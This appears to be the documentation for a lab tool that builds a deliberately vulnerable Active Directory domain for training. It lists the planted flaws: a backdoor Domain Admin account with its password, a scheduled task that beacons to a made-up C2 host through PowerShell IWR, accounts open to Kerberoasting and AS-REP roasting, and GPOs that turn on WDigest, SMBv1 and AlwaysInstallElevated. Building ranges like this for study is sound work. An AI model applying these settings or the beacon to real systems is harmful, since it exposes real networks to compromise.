# Intentional Flaws & Vulnerabilities

This document outlines the security vulnerabilities intentionally introduced into the VulnADCreationTool Active Directory environment. **DO NOT** use these configurations in a production environment.

## 1. Identity & Access Management

### Weak Password Policy
*   **Location:** `Scripts/GenerateIdentities.ps1`
*   **Description:** The default Domain Password Policy is drastically weakened.
    *   `PasswordComplexity` = 0 (Disabled)
    *   `MinimumPasswordLength` = 0
    *   `MinimumPasswordAge` = 0
*   **Impact:** Users can set trivial passwords (e.g., "1", "password"), making the domain highly susceptible to brute-force and password spraying attacks.

### Privileged Account Backdoor
*   **Location:** `Scripts/Malicious.ps1`
*   **Description:** This account represents the threat actor. A user named **"TheITGuy"** with the password (`P@ssw0rd1234!`) is created and added to the **Domain Admins** group.
*   **Impact:** In this *context*, the domain is **already** compromised, and this account serves as the threat actor's persistent foothold.

## 2. Persistence & C2

### Malicious Scheduled Task
*   **Location:** `Scripts/Malicious.ps1` & `Scripts/Data/HealthCheck.xml`
*   **Task Name:** "HealthCheck"
*   **Description:** A scheduled task configured to run at logon with "HighestAvailable" privileges (SYSTEM).
    *   **Payload:** Executes a PowerShell encoded command that attempts to contact a C2 server:
        `IWR -Uri 'http://c2.129dkasnoauema.com/beacon' -UseBasicParsing`
*   **Impact:** Establishes persistence and initiates unauthorized network connections, mimicking a beaconing malware infection.

### Kerberoasting
*   **Location:** `Scripts/Vulnerabilities.ps1`
*   **Description:** A service account **"SQLService"** is created with a registered Service Principal Name (SPN) `SQLService/db.domain.local`.
*   **Impact:** Attackers can request a TGS ticket for this service, take it offline, and crack the weak password (`readyplayerone`) to compromise the account.

### AS-REP Roasting
*   **Location:** `Scripts/Vulnerabilities.ps1`
*   **Description:** A user account **"PrintUser"** is created with the `Do not require Kerberos preauthentication` attribute enabled.
*   **Impact:** Attackers can request an AS-REP for this user without knowing their password, allowing them to capture the encrypted part of the response and crack the password (`therecanonlybeone`) offline.

## 3. Group Policy Vulnerabilities (GPOs)

The following flaws are deployed via the `Scripts/GPOCreation.ps1` script.

### Local Administrator Escalation
*   **GPO Name:** "Local Admins"
*   **Description:** Intended to add only IT staff, this GPO uses **Restricted Groups** to add the entire **"Domain Users"** group to the local **Administrators** group (SID S-1-5-32-544) on all computers.
*   **Impact:** Every user in the domain becomes a local administrator on any machine they log into, facilitating lateral movement and local credential dumping (Mimikatz).

### Legacy Protocols (SMBv1 & WDigest)
*   **GPO Name:** "Backwards Compatibility"
*   **Description:** Enables deprecated and insecure protocols via Registry.
    *   **SMBv1:** `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters` -> `SMB1 = 1`
    *   **WDigest:** `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` -> `UseLogonCredential = 1`
*   **Impact:** 
    *   **SMBv1:** Exposes the network to EternalBlue (MS17-010).
    *   **WDigest:** Forces LSASS to store plaintext passwords in memory, which can be easily extracted by tools like Mimikatz.

### AlwaysInstallElevated
*   **GPO Name:** "Backwards Compatibility"
*   **Description:** Sets the `AlwaysInstallElevated` registry key to `1` in both HKLM and HKCU.
*   **Impact:** Allows any user to run MSI installation packages with SYSTEM privileges, a classic local privilege escalation vector.

### Weak Kerberos Encryption
*   **GPO Name:** "Encryption"
*   **Description:** Configures `SupportedEncryptionTypes` to `2147483647` (All types).
*   **Impact:** Re-enables weak encryption algorithms like RC4 and DES for Kerberos tickets, making them vulnerable to roasting (AS-REP Roasting, Kerberoasting) and offline cracking.

### Remote Desktop Exposure
*   **GPO Name:** "Remote Access"
*   **Description:** Enables RDP (`fDenyTSConnections = 0`) and lowers security settings:
    *   `UserAuthentication` = 0 (NLA Disabled)
    *   `SecurityLayer` = 0 (RDP Security, not SSL/TLS)
*   **Impact:** Allows RDP connections without Network Level Authentication (NLA), making the service vulnerable to Man-in-the-Middle (MitM) attacks and BlueKeep-style exploits.

### LLMNR/NetBIOS Enabling
*   **GPO Name:** "Disable LLMNR and NBNS" (Misnamed)
*   **Description:** Sets `EnableMulticast` to `1` in the Registry.
*   **Impact:** Explicitly enables Link-Local Multicast Name Resolution (LLMNR), allowing attackers on the local subnet to perform poisoning attacks (Responder) to capture NTLMv2 hashes.

### Insecure Print Spooler (PrintNightmare)
*   **GPO Name:** "Printer Drivers"
*   **Description:** Weakens "Point and Print Restrictions" policy.
    *   `Restricted` = 1
    *   `NoWarningNoElevationOnInstall` = 1
    *   `UpdatePromptSettings` = 2
*   **Impact:** Allows non-administrative users to install printer drivers from any server without a security prompt or elevation. This facilitates "PrintNightmare" style exploitation where an attacker can force the DC to install a malicious driver.